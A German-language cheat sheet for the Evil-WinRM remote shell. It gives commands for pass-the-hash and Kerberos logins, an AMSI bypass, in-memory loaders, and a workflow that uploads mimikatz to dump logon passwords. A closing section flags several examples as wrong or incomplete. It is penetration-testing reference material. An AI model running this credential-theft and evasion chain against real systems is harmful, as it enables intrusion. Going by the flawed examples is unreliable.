# 😈 Evil-WinRM – Remote-Shell für Windows

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 The Ultimate WinRM Shell
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Evil-WinRM?](#-was-ist-evil-winrm)
- [Installation](#-installation)
- [Einfache Verbindung](#-einfache-verbindung)
- [Dateioperationen](#-dateioperationen)
- [Integrierte Befehle](#integrierte-befehle)
- [Pass-the-Hash](#-pass-the-hash)
- [Kerberos-Authentifizierung](#-kerberos-authentifizierung)
- [Kurzreferenz](#-kurzreferenz)

---

## 🎯 Was ist Evil-WinRM?

**Evil-WinRM** ist eine Shell für Windows Remote Management (WinRM) mit Funktionen für Sicherheitstests:

- 🖥️ **Interaktive Shell** – Vollständige PowerShell-Sitzung
- 📁 **Dateiübertragung** – Dateien hoch- und herunterladen
- 🔓 **Pass-the-Hash** – Authentifizierung mit einem NTLM-Hash
- 🎫 **Kerberos** – Ticketbasierte Authentifizierung
- 🧩 **Module** – PowerShell-Skripte laden

### WinRM-Ports

| Port | Protokoll | Hinweise |
|------|----------|-------|
| 5985 | HTTP | Standard |
| 5986 | HTTPS | Verschlüsselt |

---

## 🚀 Installation

### Kali Linux

```bash
# Installieren
sudo apt update
sudo apt install evil-winrm

# Oder über gem
sudo gem install evil-winrm
```

### Von GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

## 💻 Einfache Verbindung

### Authentifizierung mit Passwort

```bash
# Einfache Verbindung
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Domäne angeben
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (Port 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Port angeben
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### SSL-Optionen

```bash
# SSL ohne Zertifikatsprüfung
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Mit Zertifikat
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

## 📁 Dateioperationen

### Dateien hochladen

```bash
# Innerhalb der Evil-WinRM-Shell
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# An einen bestimmten Speicherort hochladen
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Über die Befehlszeile (mit -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Dateien herunterladen

```bash
# Datei herunterladen
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# An einen bestimmten Speicherort herunterladen
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Verzeichnis für ausführbare Dateien

```bash
# Verzeichnis ausführbarer Dateien für den Upload angeben
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Innerhalb der Shell eine EXE-Datei aus diesem Verzeichnis hochladen
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="integrierte-befehle"></a>

## 🛠️ Integrierte Befehle

### Menü

```bash
# Alle Befehle anzeigen
*Evil-WinRM* PS C:\> menu

# Verfügbare Befehle:
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

### AMSI-Umgehung

```bash
# AMSI umgehen
*Evil-WinRM* PS C:\> Bypass-4MSI

# Jetzt lassen sich vom Virenschutz erkannte Werkzeuge ausführen
```

### Skripte laden

```bash
# Mit Angabe des Skriptverzeichnisses verbinden
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Innerhalb der Shell das Skript laden
*Evil-WinRM* PS C:\> PowerView.ps1

# Funktionen aus dem Skript verwenden
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Binärdateien ausführen

```bash
# Verzeichnis ausführbarer Dateien laden
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Binärdatei im Speicher ausführen
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Mit Argumenten
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### DLLs laden

```bash
# DLL laden
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Dienste

```bash
# Dienste auflisten
*Evil-WinRM* PS C:\> services
```

---

## 🔓 Pass-the-Hash

### NTLM-Hash

```bash
# Mit Hash verbinden
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Nur der NTLM-Anteil
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Mit Domäne
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

## 🎫 Kerberos-Authentifizierung

### Einrichtung

```bash
# KRB5CCNAME auf den Ticket-Cache setzen
export KRB5CCNAME=/path/to/ticket.ccache

# /etc/krb5.conf für den Realm bearbeiten
```

### Mit Kerberos verbinden

```bash
# Kerberos-Authentifizierung
evil-winrm -i dc01.domain.local -r domain.local

# Mit einem bestimmten ccache
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

## 📊 Kurzreferenz

### Verbindungsoptionen

| Option | Beschreibung |
|--------|-------------|
| `-i` | Ziel-IP-Adresse oder Hostname |
| `-u` | Benutzername |
| `-p` | Passwort |
| `-H` | NTLM-Hash |
| `-d` | Domäne |
| `-S` | SSL (HTTPS) verwenden |
| `-P` | Port |
| `-r` | Kerberos-Realm |

### Dateioptionen

| Option | Beschreibung |
|--------|-------------|
| `-s` | Skriptverzeichnis |
| `-e` | Verzeichnis ausführbarer Dateien |
| `-c` | SSL-Zertifikat |
| `-k` | SSL-Schlüssel |

### Shell-Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `upload` | Datei hochladen |
| `download` | Datei herunterladen |
| `menu` | Befehle anzeigen |
| `Bypass-4MSI` | AMSI umgehen |
| `Invoke-Binary` | EXE-Datei im Speicher ausführen |
| `services` | Dienste auflisten |
| `Dll-Loader` | DLL laden |

### Typischer Ablauf

```bash
# 1. Verbinden
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. AMSI umgehen
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Werkzeuge hochladen
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Ausführen
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Ergebnisse herunterladen
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Ressourcen

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [WinRM-Dokumentation](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Verwandte Cheatsheets
- [CrackMapExec](../../CrackMapExec/translations/README.de.md)
- [Impacket](../../Impacket/translations/README.de.md)
- [Mimikatz](../../Mimikatz/translations/README.de.md)

---

<p align="center">
  <b>😈 Die ultimative WinRM-Shell!</b><br>
  <i>Evil-WinRM – Windows souverän übernehmen</i>
</p>

## Hinweise zu Versionen und Voraussetzungen

Die Beispiele oben wurden aus dem englischen Original übernommen. Folgende Einordnungen beziehen sich auf den geprüften offiziellen Quellstand mit Versionsangabe **4.1**:

- **Optionen und Hashformat:** Der Optionsparser enthält kein `-d`; die entsprechenden Beispiele und der Tabelleneintrag sind daher nicht unmittelbar verwendbar. `-H` erwartet genau 32 hexadezimale Zeichen für den NT-Hash. Das Beispiel mit `LM:NT` sowie der Platzhalter `NTLMHASH` erfüllen diese Prüfung nicht. `-P` setzt nur den Port; `-P 5986` allein aktiviert kein HTTPS. Dafür ist `-S` maßgeblich. Im geprüften SSL-Verbindungszweig wird die Prüfung des Serverzertifikats deaktiviert. ([Offizieller Quellcode](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/evil-winrm.rb))
- **Lokale und entfernte Pfade:** `-s` und `-e` bezeichnen lokale Verzeichnisse auf dem Client. `-e` ist das Verzeichnis für die ausführbaren Dateien des Helpers, kein allgemeines Upload-Basisverzeichnis; die dort stehenden Upload-Kommentare sind missverständlich. Bei `upload` ist die Quelle lokal und das Ziel entfernt, bei `download` umgekehrt. Ohne absoluten lokalen Pfad zählt das lokale Arbeitsverzeichnis. ([Offizielles README](https://github.com/Hackplayers/evil-winrm), [Quellcode](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/evil-winrm.rb))
- **Helper:** `menu` stellt unter anderem die Loader-Funktionen bereit. `Invoke-Binary` ist für .NET-Assemblies gedacht; eine gewöhnliche native `mimikatz.exe` ist dafür kein passendes Beispiel. Auch die Argumentübergabe im Original entspricht nicht der dokumentierten, kommaseparierten Form. `Dll-Loader` lädt verwaltete Assemblies und benötigt zusätzlich zum Pfad eine Herkunftsoption wie `-local`, `-http` oder `-smb`; der Originalaufruf ist unvollständig. Bei `Dll-Loader -local` liegt die DLL auf dem entfernten Windows-System; auch SMB- und HTTP-Zugriffe erfolgen dort. ([Offizielles README](https://github.com/Hackplayers/evil-winrm))
- **Authentifizierung und Verschlüsselung:** WinRM muss erreichbar sein und das Konto die nötigen Zugriffsrechte besitzen. Kerberos benötigt passende Domänen-/Realm-Konfiguration, einen geeigneten Hostnamen und gültige Tickets; eine IP-Adresse ersetzt den Kerberos-Hostnamen nicht. Zertifikatsauthentifizierung erfordert eine passende serverseitige Konfiguration und Zertifikatszuordnung. HTTP auf Port `5985` bedeutet zudem nicht automatisch unverschlüsselte Nachrichten: Der Schutz hängt auch vom Authentifizierungsverfahren ab. ([Microsoft: WinRM-Authentifizierung](https://learn.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections))
- **AMSI:** Die Bezeichnung `Bypass-4MSI` garantiert weder eine erfolgreiche Umgehung noch, dass anschließend jedes vom Virenschutz erkannte Werkzeug läuft. AMSI ist eine Schnittstelle zu Schutzprodukten und nur ein Teil der möglichen Prüfungen; die Aussage im Original ist daher zu pauschal. ([Microsoft: AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal))
